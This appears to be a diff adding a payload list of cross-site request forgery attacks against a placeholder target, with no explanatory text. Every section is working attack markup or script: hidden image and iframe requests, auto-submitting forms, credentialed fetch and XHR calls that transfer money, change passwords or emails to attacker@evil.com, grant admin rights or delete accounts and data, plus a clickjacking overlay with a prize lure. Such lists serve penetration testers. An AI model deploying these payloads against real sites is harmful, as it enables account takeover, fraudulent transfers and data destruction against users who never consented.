@@ -1,0 +1,84 @@
+# Basic CSRF payloads
+<img src="https://vulnerable-site.com/api/transfer?to=attacker&amount=1000">
+<img src="https://vulnerable-site.com/api/changePassword?newPassword=hacked123" style="display:none">
+
+# Form-based CSRF
+<form action="https://vulnerable-site.com/api/transfer" method="POST" id="csrf-form">
+  <input type="hidden" name="to" value="attacker">
+  <input type="hidden" name="amount" value="1000">
+</form>
+<script>document.getElementById("csrf-form").submit();</script>
+
+# Auto-submitting forms
+<body onload="document.forms[0].submit()">
+<form action="https://vulnerable-site.com/api/updateProfile" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.com">
+</form>
+</body>
+
+# CSRF with JSON
+<script>
+fetch('https://vulnerable-site.com/api/user/profile', {
+  method: 'PUT',
+  credentials: 'include',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    email: 'attacker@evil.com',
+    isAdmin: true
+  })
+});
+</script>
+
+# CSRF with multipart/form-data
+<script>
+var formData = new FormData();
+formData.append('profilePicture', 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD3+iiigD//2Q==');
+formData.append('username', 'admin');
+
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://vulnerable-site.com/api/updateProfile');
+xhr.withCredentials = true;
+xhr.send(formData);
+</script>
+
+# CSRF with clickjacking
+<style>
+  iframe {
+    width: 500px;
+    height: 500px;
+    position: absolute;
+    top: -100px;
+    left: -100px;
+    opacity: 0.00001;
+    z-index: 2;
+  }
+  button {
+    position: absolute;
+    top: 300px;
+    left: 200px;
+    z-index: 1;
+  }
+</style>
+<div>
+  <iframe src="https://vulnerable-site.com/settings"></iframe>
+  <button>Click to win a prize!</button>
+</div>
+
+# CSRF with XHR
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://vulnerable-site.com/api/changeEmail', true);
+xhr.withCredentials = true;
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+xhr.send('email=attacker@evil.com');
+</script>
+
+# CSRF with iframe
+<iframe src="https://vulnerable-site.com/api/deleteAccount" style="display:none"></iframe>
+
+# CSRF with SVG
+<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
+  <image href="https://vulnerable-site.com/api/deleteAllData" height="100" width="100"/>
+</svg>
